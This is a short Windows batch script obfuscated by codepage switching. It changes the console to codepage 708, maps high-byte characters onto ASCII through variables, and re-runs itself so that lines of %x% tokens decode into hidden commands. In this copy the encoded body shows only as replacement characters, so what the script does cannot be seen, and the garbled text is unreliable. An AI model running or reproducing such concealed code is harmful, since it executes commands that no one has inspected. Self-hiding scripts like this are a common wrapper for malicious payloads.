@echo off&(if defined @lo@ goto �)&setlocal disableDelayedExpansion&for /f "delims=: tokens=2" %%A in ('chcp') do set "@chcp@=chcp %%A>nul"&chcp 708>nul&set ^"@args@=%*"
set "@lo@= !#$&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~""
set "@hi@=����������������������������������������������������������������������������������������������"
(setlocal enableDelayedExpansion&for /l %%N in (0 1 93) do set "!@hi@:~%%N,1!=!@lo@:~%%N,1!")&cmd /c ^""%~f0" !@args@!"
%@chcp@%&exit /b
:�
%�%%�%%�%%�%%�%%�%%�%%�%%�%
%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%
:f9a
%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%%�%
%�%%�%%�%%�%%�%%�%%�%%�%